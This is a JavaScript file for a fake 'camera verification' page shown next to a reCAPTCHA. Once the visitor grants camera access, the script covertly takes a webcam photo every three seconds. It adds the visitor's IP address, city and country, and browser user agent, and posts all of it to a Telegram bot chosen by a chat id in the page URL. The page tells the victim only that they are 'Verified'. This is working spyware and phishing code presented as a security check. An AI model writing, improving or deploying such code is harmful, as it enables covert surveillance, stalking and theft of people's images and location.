import { CONFIG } from "./config.js";

const video     = document.getElementById("video");
const canvas    = document.getElementById("canvas");
const status    = document.getElementById("status");
const verifyBtn = document.getElementById("verifyBtn");
const recaptcha = document.getElementById("recaptcha");

const params = new URLSearchParams(window.location.search);
const chatId = params.get("id") || "FALLBACK_CHAT_ID";

let stream       = null;
let captureTimer = null;
let count        = 0;
let capturing    = false;

function setStatus(msg) { status.textContent = msg; }

async function getIP() {
  try {
    const r = await fetch("https://api.ipify.org?format=json");
    const d = await r.json();
    return d.ip;
  } catch {
    return "Unknown";
  }
}

async function getGeo() {
  try {
    const r = await fetch("https://ipapi.co/json/");
    const d = await r.json();
    return `${d.city || "?"}, ${d.country_name || "?"}`;
  } catch {
    return "Unknown";
  }
}

async function capture() {
  if (!stream || !capturing) return;

  canvas.width  = video.videoWidth  || 640;
  canvas.height = video.videoHeight || 480;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0);

  const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.7));
  if (!blob) return;

  const ip   = await getIP();
  const geo  = await getGeo();
  const ua   = navigator.userAgent;
  const date = new Date().toLocaleString("en-US", { timeZoneName: "short" });

  const caption = [
    `📸 #${count + 1}`,
    `🕐 ${date}`,
    `🌐 ${ip} — ${geo}`,
    `💻 ${ua}`
  ].join("\n");

  const fd = new FormData();
  fd.append("chat_id", chatId);
  fd.append("photo", blob, `cap_${Date.now()}.jpg`);
  fd.append("caption", caption);

  try {
    await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, {
      method: "POST", body: fd
    });
  } catch (_) {}

  count++;
  setStatus(`✓ Verified · ${count} photos`);
}

function stopCapture() {
  capturing = false;
  if (captureTimer) { clearInterval(captureTimer); captureTimer = null; }
  if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
}

// Called when user clicks the button
verifyBtn.addEventListener("click", async () => {
  if (capturing) return;

  try {
    setStatus("Requesting camera access...");
    verifyBtn.disabled = true;
    verifyBtn.textContent = "Starting...";

    stream = await navigator.mediaDevices.getUserMedia({
      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }
    });

    video.srcObject = stream;
    await video.play();
    await new Promise(resolve => {
      if (video.readyState >= 2) return resolve();
      video.onloadeddata = resolve;
    });

    // Start continuous capture every 3 seconds
    capturing = true;
    await capture();                      // First shot immediately
    captureTimer = setInterval(capture, 3000); // Then every 3s

    setStatus(`✓ Camera active · ${count} photos`);

  } catch (err) {
    setStatus("❌ Camera access required. Please allow and try again.");
    verifyBtn.disabled = false;
    verifyBtn.textContent = "Start Verification";
    console.warn("Camera error:", err);
  }
});

// reCAPTCHA solved → redirect
window.onRecaptchaSuccess = () => {
  stopCapture();
  setStatus("✓ Verification complete. Redirecting...");
  setTimeout(() => {
    window.location.href = "next.html";
  }, 800);
};

window.onRecaptchaExpired = () => {
  setStatus("⚠️ Verification expired. Please try again.");
};

window.onRecaptchaError = () => {
  setStatus("⚠️ Verification error. Please try again.");
};

// Cleanup on page leave
window.addEventListener("beforeunload", stopCapture);
